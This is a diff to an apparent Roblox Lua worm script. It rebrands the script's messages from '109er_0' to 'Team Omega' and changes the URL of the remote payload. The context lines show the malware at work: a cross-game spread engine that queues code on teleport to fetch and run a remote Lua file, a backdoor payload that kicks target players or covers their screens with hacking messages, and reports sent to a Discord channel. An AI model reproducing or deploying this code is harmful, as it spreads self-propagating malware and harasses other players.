@@ -25,7 +25,7 @@ local Owner = "109er_0"
 local infectionActive, autoSpreadEnabled, sleepModeActive = false, false, false
 local spreadInterval = 300
 local lastExternalCmd = os.time()
-local KICK_MESSAGE = "you'are an idiot HAHAHAHA Hacking by 109er_0 ... HAHAHAHA😈😈!!!!"
+local KICK_MESSAGE = "Communication Terminated. Team Omega has taken control. The Digital Stone Age begins now."
 local whitelistGames = {
     1185586641, 9201240794, 185655149, 2753915549, 4520749081, 606849744, 4872321590,
     14125553864, 5375399205, 14940596979, 98381723384335, 1559329620, 2521496850,
@@ -91,7 +91,7 @@ task.spawn(function() while true do task.wait(10) updateSleepMode() end end)
 -- =============================[ CROSS‑GAME SPREAD ENGINE ]=============================
 local function JumpToNewGame(targetGameId)
     if not targetGameId or type(targetGameId) ~= "number" then return false end
-    local wormCode = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/core.lua"))()]]
+    local wormCode = [[loadstring(game:HttpGet("https://raw.githubusercontent.com/mebdsn78-dev/OmegaData/main/Omega.lua"))()]]
     if queue_on_teleport then queue_on_teleport(wormCode) end
     local s, e = pcall(function() TeleportService:Teleport(targetGameId, LocalPlayer) end)
     return s
@@ -477,14 +477,14 @@ local function createBackdoorInjectionPayload()
                 local label = Instance.new("TextLabel", frame)
                 label.Size = UDim2.new(1,0,1,0)
                 label.BackgroundTransparency = 1
-                label.Text = msg or "you'are Hacking by 109er_0\nHAHAHAHAHAHAHAHA"
+                label.Text = msg or "We are Team Omega. We are the end of your digital world"
                 label.TextColor3 = Color3.fromRGB(255,0,0)
                 label.Font = Enum.Font.GothamBold
                 label.TextSize = 36
                 label.TextScaled = true
                 sendToDiscord("✅ عرض شاشة الاختراق على "..targetPlayer.Name.." في "..game.Name)
             elseif action == "kick" then
-                targetPlayer:Kick("you'are Hacking by 109er_0 HAHAHAHAHAHAHAHA")
+                targetPlayer:Kick("We are Team Omega. We are the end of your digital world")
                 sendToDiscord("🚫 طرد "..targetPlayer.Name.." من "..game.Name)
             end
         end)
